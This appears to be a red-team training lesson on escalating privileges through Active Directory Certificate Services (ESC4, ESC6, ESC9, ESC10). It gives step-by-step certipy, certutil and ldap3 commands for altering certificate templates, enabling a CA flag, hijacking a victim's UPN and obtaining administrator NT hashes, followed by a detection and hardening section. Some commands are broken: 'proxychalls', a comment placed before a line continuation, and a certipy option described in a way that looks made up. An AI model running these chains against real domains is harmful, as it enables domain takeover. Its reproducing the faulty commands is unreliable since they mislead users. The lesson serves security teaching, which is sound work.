---
title: "ADCS Advanced — ESC4, ESC6, ESC9, and Certificate Mapping Attacks"
tags: [red-team, ADCS, certificate-services, ESC4, ESC6, ESC9, ESC10, certipy,
  certificate-mapping, template-misconfiguration, CA-misconfiguration,
  T1649, ATT&CK, detection, PKI, PKIView]
module: 08-RedTeam-03
day: 545
related_topics:
  - Shadow Credentials and PKINIT (Day 544)
  - Advanced LOLAD (Day 546)
  - ADCS Attack Surface (Day 511)
  - ADCS ESC1 Lab (Day 512)
  - ADCS ESC8 PetitPotam Lab (Day 513)
---

# Day 545 — ADCS Advanced: ESC4, ESC6, ESC9, and Certificate Mapping

> "You covered ESC1 and ESC8. Those are the two techniques everyone knows now.
> Defenders are starting to patch them. ESC4, ESC6, ESC9, and ESC10 are the
> next generation — subtler misconfigurations, harder to detect, and equally
> devastating. In an environment that thinks it hardened ADCS after patching
> the obvious ones, these are your paths."
>
> — Ghost

---

## Goals

Understand and exploit ESC4 — writable certificate template configuration.
Understand and exploit ESC6 — CA flag EDITF_ATTRIBUTESUBJECTALTNAME2.
Understand ESC9 and ESC10 — certificate mapping abuse and weak binding.
Map each escalation to its real-world detection and remediation.

**Prerequisites:** Day 511 (ADCS attack surface), Day 512 (ESC1 lab),
Day 513 (ESC8 lab), certipy tool familiarity.
**Time budget:** 5 hours.

---

## Part 1 — ADCS Vulnerability Map Recap

```
ESC1: Enrollee Supplies Subject (SAN injection) in template
  → Covered Day 512

ESC2: Any Purpose EKU or no EKU → acts as a CA cert
  → Certificate can be used for any purpose

ESC3: Enrollment Agent template misconfig
  → Certificate can enroll on behalf of other users

ESC4: Template ACL misconfiguration — writable by low-priv user
  → Modify template to add SAN injection → instant ESC1

ESC5: PKI object ACL — low-priv user can modify CA object
  → Less common

ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
  → All templates allow SAN injection regardless of template setting

ESC7: CA ACL — user has ManageCA or ManageCertificates right
  → Can enable the ESC6 flag, approve revoked certs, etc.

ESC8: NTLM relay to AD CS HTTP enrollment endpoint
  → Covered Day 513

ESC9: No security extension / no UPN binding → certificate mapped by name
ESC10: Weak certificate mapping → UPN in SAN overrides account name
```

---

## Part 2 — ESC4: Writable Template → ESC1 on Demand

```
ESC4 occurs when a low-privileged user has:
  Write, WriteDACL, WriteOwner, or GenericAll
  on a certificate TEMPLATE object in AD

Impact:
  You modify the template to add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
  → The template immediately becomes vulnerable to ESC1
  → You enroll for a certificate with any SAN you choose
  → Undo the modification after issuing the cert

Why this matters:
  Many environments "harden" ESC1 by removing SAN injection from templates.
  But if the template ACL is permissive, an attacker re-enables it,
  issues a cert, then re-removes the flag.
  The hardened template was unhardened and re-hardened in seconds.
```

### Finding ESC4 with certipy

```bash
# Run certipy find — ESC4 is flagged under "Enabled" templates
proxychains certipy find \
    -u your_user -p 'pass' \
    -dc-ip <DC_IP> \
    -vulnerable -stdout 2>/dev/null | grep -A 20 "ESC4"

# Output example:
# Certificate Templates
#   Template Name                       : UserCert
#   Enabled                             : True
#   ...
#   [!] Vulnerabilities
#     ESC4: 'CORP\Domain Users' has dangerous permissions
```

### ESC4 Exploitation

```bash
# Step 1: Modify the template — add SAN injection flag
proxychains certipy template \
    -u your_user -p 'pass' \
    -dc-ip <DC_IP> \
    -template 'UserCert' \
    -save-old          # saves old config for restoration

# certipy template adds msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT

# Step 2: Request a certificate with DA SAN (now ESC1-equivalent)
proxychains certipy req \
    -u your_user -p 'pass' \
    -ca 'corp-CA' \
    -target <CA_SERVER_IP> \
    -template 'UserCert' \
    -upn 'administrator@corp.local' \
    -out admin_cert

# Step 3: Authenticate with the cert
proxychains certipy auth \
    -pfx admin_cert.pfx \
    -dc-ip <DC_IP>

# Output: NT hash for administrator

# Step 4: Restore the template (important for stealth and ethics)
proxychains certipy template \
    -u your_user -p 'pass' \
    -dc-ip <DC_IP> \
    -template 'UserCert' \
    -configuration <old_config_file>

# Detection:
#   Event ID 4899 (Certificate Services: A Certificate Template was Updated)
#   → Fires every time msPKI-Certificate-Name-Flag is modified
#   Alert: any template modification outside a change management window
```

---

## Part 3 — ESC6: CA EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

```
ESC6 vulnerability:
  The Certificate Authority itself has the flag EDITF_ATTRIBUTESUBJECTALTNAME2 set
  
  Effect:
  → ANY template that allows enrollment can be used with a custom SAN
  → Even templates that do NOT have CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set
  → Because the CA-level flag overrides the template-level restriction

This is a CA configuration issue, not a template issue.
Hardening: templates have ESC1 protection but the CA ignores it.

Who can set this flag:
  → Requires ManageCA right on the Certificate Authority
  → If you have ESC7 (ManageCA right), you can set ESC6 yourself
```

### Detecting ESC6

```bash
# Check for the flag using certipy:
proxychains certipy find \
    -u your_user -p 'pass' \
    -dc-ip <DC_IP> \
    -vulnerable -stdout | grep "ESC6"

# Or manually via certutil on any domain-joined Windows host:
certutil -config "CA-SERVER\corp-CA" -getreg policy\EditFlags

# Look for: EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000) in the output
# If present → ESC6 exists
```

### ESC6 Exploitation

```bash
# With ESC6: use any standard enrollment template with -upn flag
# The CA ignores the template's no-SAN restriction

proxychains certipy req \
    -u your_user -p 'pass' \
    -ca 'corp-CA' \
    -target <CA_SERVER_IP> \
    -template 'User'              # standard template — no SAN normally
    -upn 'administrator@corp.local' \
    -out admin_esc6

proxychalls certipy auth \
    -pfx admin_esc6.pfx \
    -dc-ip <DC_IP>
# Returns administrator's NT hash
```

### ESC7 → ESC6 Escalation Chain

```bash
# If you have ManageCA on the CA (ESC7):
# Enable the ESC6 flag yourself

proxychains certipy ca \
    -u your_user -p 'pass' \
    -dc-ip <DC_IP> \
    -ca 'corp-CA' \
    -enable-telemetry          # certipy uses this flag for EDITF_ATTR...

# Or via certutil on Windows:
certutil -config "CA-SERVER\corp-CA" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc  # restart CA service for flag to take effect

# Now: ESC6 is enabled → exploit as above
# Undo:
certutil -config "CA-SERVER\corp-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

---

## Part 4 — ESC9 and ESC10: Certificate Mapping Weaknesses

```
Background: how Windows maps a certificate to an AD account for auth

  Strong binding (secure, modern):
    The KDC checks:
    1. The SID extension (OID 1.3.6.1.4.1.311.25.2) in the certificate
    2. Issued AFTER the account was created
    → The certificate is cryptographically bound to a specific account SID
    → Cannot be forged for a different account

  Weak binding (legacy, exploitable):
    If the certificate lacks the SID extension, the KDC falls back to:
    1. UPN (userPrincipalName) mapping — matches the UPN in the cert SAN
    2. Email address mapping
    → These can be manipulated if an attacker can influence the UPN field

ESC9:
  Template has CT_FLAG_NO_SECURITY_EXTENSION
  → Certificates issued from this template lack the SID binding extension
  → Even if issued for a specific user, the cert is accepted for any account
    whose UPN matches the SAN — including after account changes
  
  Attack: if you can change a user's UPN (requires GenericWrite on the user)
    → Change targetUser's UPN to "administrator@corp.local"
    → Request a cert for targetUser (with the changed UPN)
    → Authenticate as administrator using PKINIT
    → Change UPN back (cover tracks)

ESC10:
  Strong Certificate Binding Enforcement is weak or disabled
  Registry: HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement
  Value 0 or 1 (should be 2 for full enforcement)
  → Similar to ESC9 but the weakness is in the KDC's enforcement setting
  → Certificates without SID extension are accepted even if the account
    changed after the cert was issued
```

### ESC9 Attack

```bash
# Prerequisites:
# 1. Template with CT_FLAG_NO_SECURITY_EXTENSION
# 2. GenericWrite on a victim account (to change their UPN)
# 3. Victim account can enroll in the ESC9 template

# Step 1: Check if template has CT_FLAG_NO_SECURITY_EXTENSION
proxychains certipy find \
    -u your_user -p 'pass' \
    -dc-ip <DC_IP> -vulnerable -stdout | grep -A 20 "ESC9"

# Step 2: Change victim's UPN to DA's UPN
proxychains python3 -c "
from ldap3 import Server, Connection, MODIFY_REPLACE, ALL
s = Server('<DC_IP>', get_info=ALL)
c = Connection(s, 'corp.local\\your_user', 'pass', auto_bind=True)
c.modify('CN=victim,OU=Users,DC=corp,DC=local',
    {'userPrincipalName': [(MODIFY_REPLACE, ['administrator@corp.local'])]})
print(c.result)
"

# Step 3: Enroll certificate as victim_user (their UPN is now administrator@corp.local)
proxychains certipy req \
    -u victim_user -p 'victim_pass' \
    -ca 'corp-CA' \
    -template 'ESC9Template' \
    -out victim_cert

# Step 4: Revert victim's UPN immediately
# (same ldap3 command, change UPN back to victim_user@corp.local)

# Step 5: Authenticate with the cert — DC resolves to administrator
proxychains certipy auth \
    -pfx victim_cert.pfx \
    -dc-ip <DC_IP>
```

---

## Part 5 — Detection Across All ADCS ESC Classes

```
Unified detection approach (enable ALL of these):

1. Event ID 4899 — Certificate Template Updated
   → Any modification to any template outside of change control
   → Sigma: alert on EventID 4899 with TemplateName not in approved_list

2. Event ID 4886/4887 — Certificate Issued / Certificate Request Denied
   → Look for: SubjectAltName present in issued certs for user templates
   → Alert: SAN in a user cert that is NOT a user template with SAN enabled

3. Event ID 4768/4769 — Kerberos AS-REQ/TGS-REQ with certificate auth
   → CertIssuerName field present → PKINIT authentication
   → Alert: PKINIT auth for an account from a device not in WHfB inventory

4. CertUtil audit:
   Regularly run: certutil -view -out "RequestID,RequesterName,SubjectAltName"
   against the CA log → identify any certs where SAN ≠ requester identity

5. StrongCertificateBindingEnforcement:
   Check on all DCs:
   Get-ItemProperty HKLM:\System\CurrentControlSet\Services\Kdc\
       StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue
   Value should be 2. Value 0 or absent → ESC10 risk.
   Set to 2:
   Set-ItemProperty HKLM:\System\CurrentControlSet\Services\Kdc\
       -Name StrongCertificateBindingEnforcement -Value 2

6. Certipy continuous monitoring:
   Run certipy find regularly in your environment as a defensive tool
   Any new ESC flag in the output = remediate within 24 hours
```

---

## Exercises

1. Run `certipy find -vulnerable` in your lab. Document every ESC class
   found, the affected template or CA, and the specific misconfiguration.
   Produce a one-page ADCS vulnerability report in the format of a real
   finding (title, severity, evidence, remediation).
2. If ESC4 is present in your lab: execute the full chain — modify template,
   issue DA cert, restore template, authenticate, get NT hash. Time the
   window between template modification and restoration. Is the modification
   visible for long enough for a defender to catch it?
3. Enable Event ID 4899 auditing on your lab CA. Run the ESC4 exploit.
   Verify the 4899 event fires. Write the Sigma rule that would alert on
   this event for any template not in an approved list.
4. Check the StrongCertificateBindingEnforcement registry value on your
   lab DC. If it is not 2, set it to 2. Then run an ESC9 attack against
   your lab. Does the cert still work? Document the result.
5. Explain why ESC6 is harder to exploit remotely than ESC1 and what
   additional condition must be true for an attacker to exploit it.

---

## Key Takeaways

1. ADCS attack surface extends well beyond ESC1 and ESC8. ESC4 is
   particularly dangerous because it converts a protected template into
   an ESC1-vulnerable one temporarily — and most environments do not have
   Event ID 4899 alerting.
2. ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) is a CA-level misconfiguration
   that bypasses all template-level ESC1 hardening. An environment that
   hardened every template but left this CA flag enabled is still fully
   vulnerable to SAN injection across all templates.
3. ESC9 and ESC10 abuse the certificate-to-account mapping logic, not the
   enrollment logic. They require additional prerequisites (GenericWrite
   on a user, or weak KDC enforcement) but provide a stealthy path because
   the cert appears legitimately issued — the flaw is in how it is consumed.
4. `certutil -view` on the CA is the defender's most underused tool. Reviewing
   the CA issuance log for unexpected SANs catches post-exploitation cert
   abuse that no network sensor would detect.
5. StrongCertificateBindingEnforcement set to 2 is the most impactful single
   defensive change for ADCS hardening after patching ESC1–ESC8. Microsoft
   recommends this setting and has been moving toward enforcing it by default
   in Windows updates — but many environments have it disabled for compatibility.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q545.1, Q545.2 …).

---

## Navigation

← Previous: [Day 544 — Shadow Credentials and PKINIT](DAY-0544-Shadow-Credentials-PKINIT.md)
→ Next: [Day 546 — Advanced LOLAD and LOLBAS in Mature Environments](DAY-0546-Advanced-LOLAD-LOLBAS.md)
